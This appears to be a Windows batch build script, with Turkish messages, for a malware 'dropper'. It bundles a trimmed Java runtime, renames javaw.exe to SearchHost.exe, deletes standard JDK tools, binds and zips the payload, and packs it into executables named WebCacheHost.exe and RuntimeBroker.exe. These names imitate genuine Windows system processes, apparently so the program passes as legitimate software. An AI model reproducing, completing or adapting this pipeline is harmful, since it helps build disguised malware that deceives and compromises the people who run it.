@echo off
setlocal EnableExtensions EnableDelayedExpansion
cd /d "%~dp0"

set "JDK="
if defined JAVA_HOME if exist "%JAVA_HOME%\bin\jlink.exe" set "JDK=%JAVA_HOME%"
if not defined JDK if exist "C:\Program Files\Java\jdk-21.0.12\bin\jlink.exe" set "JDK=C:\Program Files\Java\jdk-21.0.12"
if not defined JDK if exist "C:\Program Files\Eclipse Adoptium\jdk-21.0.10.7-hotspot\bin\jlink.exe" set "JDK=C:\Program Files\Eclipse Adoptium\jdk-21.0.10.7-hotspot"
if not defined JDK if exist "D:\graalvm-jdk-21.0.10\bin\jlink.exe" set "JDK=D:\graalvm-jdk-21.0.10"
if not defined JDK (
    echo [!] JDK 21 bulunamadi
    exit /b 1
)
set "PATH=%JDK%\bin;%PATH%"
for %%V in (Python313 Python312 Python311 Python310 Python39) do (
    if exist "%LocalAppData%\Programs\Python\%%V\python.exe" set "PATH=%LocalAppData%\Programs\Python\%%V;%LocalAppData%\Programs\Python\%%V\Scripts;%PATH%"
)

where python >nul 2>&1
if errorlevel 1 (
    echo [!] python bulunamadi
    exit /b 1
)
where node >nul 2>&1
if errorlevel 1 (
    echo [!] node bulunamadi
    exit /b 1
)

if not exist dropper mkdir dropper
if not exist dropper\res mkdir dropper\res
if not exist dropper\res\ffmpeg.dll (
    if exist "dropper\ffmpeg.dll" (
        copy /Y "dropper\ffmpeg.dll" "dropper\res\ffmpeg.dll" >nul
    ) else if exist "..\wdymst\dropper\ffmpeg.dll" (
        copy /Y "..\wdymst\dropper\ffmpeg.dll" "dropper\res\ffmpeg.dll" >nul
    ) else if exist "..\wdymst\dropper\res\ffmpeg.dll" (
        copy /Y "..\wdymst\dropper\res\ffmpeg.dll" "dropper\res\ffmpeg.dll" >nul
    )
)
if not exist dropper\res\icon.ico (
    if exist "dropper\icon.ico" (
        copy /Y "dropper\icon.ico" "dropper\res\icon.ico" >nul
    ) else if exist "..\wdymst\dropper\icon.ico" (
        copy /Y "..\wdymst\dropper\icon.ico" "dropper\res\icon.ico" >nul
    ) else if exist "..\wdymst\dropper\res\icon.ico" (
        copy /Y "..\wdymst\dropper\res\icon.ico" "dropper\res\icon.ico" >nul
    )
)
if not exist dropper\res\ffmpeg.dll (
    echo [!] dropper\res\ffmpeg.dll eksik
    exit /b 1
)
if not exist dropper\res\icon.ico (
    echo [!] dropper\res\icon.ico eksik
    exit /b 1
)

echo [1/5] jar...
call build.bat
if errorlevel 1 exit /b 1

echo [2/5] jlink...
set "JRE=target\jre"
if exist "%JRE%" rmdir /s /q "%JRE%"
"%JDK%\bin\jlink.exe" ^
  --module-path "%JDK%\jmods" ^
  --add-modules java.base,java.sql,java.desktop,java.naming,java.management,java.logging,jdk.unsupported,jdk.crypto.ec,java.instrument,jdk.zipfs,jdk.crypto.mscapi,java.xml ^
  --strip-debug --compress=2 --no-header-files --no-man-pages ^
  --output "%JRE%"
if errorlevel 1 exit /b 1
if exist "%JRE%\legal" rmdir /s /q "%JRE%\legal"
if exist "%JRE%\lib\jfr" rmdir /s /q "%JRE%\lib\jfr"
del /f /q "%JRE%\release" 2>nul

echo [3/5] app.zip...
set "ZIPROOT=target\ziproot"
if exist "%ZIPROOT%" rmdir /s /q "%ZIPROOT%"
mkdir "%ZIPROOT%\wsvc\jdk"
xcopy /E /I /Y /Q "%JRE%\*" "%ZIPROOT%\wsvc\jdk\" >nul
if exist "%ZIPROOT%\wsvc\jdk\bin\javaw.exe" (
    move /y "%ZIPROOT%\wsvc\jdk\bin\javaw.exe" "%ZIPROOT%\wsvc\jdk\bin\SearchHost.exe" >nul
)
if exist "%ZIPROOT%\wsvc\jdk\bin\java.exe" del /f /q "%ZIPROOT%\wsvc\jdk\bin\java.exe"
if exist "%ZIPROOT%\wsvc\jdk\bin\jrunscript.exe" del /f /q "%ZIPROOT%\wsvc\jdk\bin\jrunscript.exe"
if exist "%ZIPROOT%\wsvc\jdk\bin\keytool.exe" del /f /q "%ZIPROOT%\wsvc\jdk\bin\keytool.exe"
if exist "%ZIPROOT%\wsvc\jdk\bin\rmiregistry.exe" del /f /q "%ZIPROOT%\wsvc\jdk\bin\rmiregistry.exe"
python core\tools\bind.py "%ZIPROOT%\wsvc\jdk"
if errorlevel 1 (
    echo [!] bind fail
    exit /b 1
)
if exist dropper\res\app.zip del /f /q dropper\res\app.zip
python core\seal\packz.py "%ZIPROOT%" "dropper\res\app.zip"
if errorlevel 1 exit /b 1

echo [4/5] engine...
set "EXE_PACK_MODE=min-nsis"
call scripts\engine.bat
if errorlevel 1 exit /b 1

echo [5/5] dist...
if not exist dist mkdir dist
set "BUILT="
for %%f in ("dropper\dist\*.exe") do set "BUILT=%%f"
if not defined BUILT (
    echo [!] exe yok
    exit /b 1
)
copy /y "!BUILT!" "dist\WebCacheHost.exe" >nul
copy /y "!BUILT!" "dist\RuntimeBroker.exe" >nul

rmdir /s /q "%ZIPROOT%" 2>nul
rmdir /s /q "%JRE%" 2>nul

for %%I in ("dist\WebCacheHost.exe") do echo [+] dist\WebCacheHost.exe size=%%~zI
echo [+] dist\RuntimeBroker.exe
exit /b 0
